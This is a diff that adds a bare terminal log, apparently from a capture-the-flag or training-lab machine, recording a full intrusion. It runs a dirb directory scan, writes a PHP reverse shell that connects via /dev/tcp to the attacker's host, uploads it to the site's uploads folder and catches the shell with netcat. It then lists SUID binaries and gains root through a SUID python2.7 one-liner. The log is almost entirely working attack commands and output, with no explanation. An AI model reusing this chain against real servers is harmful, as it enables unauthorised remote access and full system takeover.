@@ -1,0 +1,135 @@
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://10.201.124.60     
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Oct 31 04:28:14 2025
+URL_BASE: http://10.201.124.60/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.201.124.60/ ----
+==> DIRECTORY: http://10.201.124.60/css/                                                                            
++ http://10.201.124.60/index.php (CODE:200|SIZE:616)                                                                
+==> DIRECTORY: http://10.201.124.60/js/                                                                             
+==> DIRECTORY: http://10.201.124.60/panel/                                                                          
++ http://10.201.124.60/server-status (CODE:403|SIZE:278)                                                            
+==> DIRECTORY: http://10.201.124.60/uploads/     
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat revshell.php5                        
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.66.96/53 0>&1'");
+?>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+http://10.201.124.60/uploads/revshell.php5
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53
+listening on [any] 53 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.124.60] 40656
+bash: cannot set terminal process group (791): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-201-124-60:/var/www/html/uploads$ 
+
+www-data@ip-10-201-124-60:/var/www$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python2.7
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/snap/core20/2599/usr/bin/chfn
+/snap/core20/2599/usr/bin/chsh
+/snap/core20/2599/usr/bin/gpasswd
+/snap/core20/2599/usr/bin/mount
+/snap/core20/2599/usr/bin/newgrp
+/snap/core20/2599/usr/bin/passwd
+/snap/core20/2599/usr/bin/su
+/snap/core20/2599/usr/bin/sudo
+/snap/core20/2599/usr/bin/umount
+/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2599/usr/lib/openssh/ssh-keysign
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/umount
+www-data@ip-10-201-124-60:/var/www$ 
+
+
+www-data@ip-10-201-124-60:/var/www$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
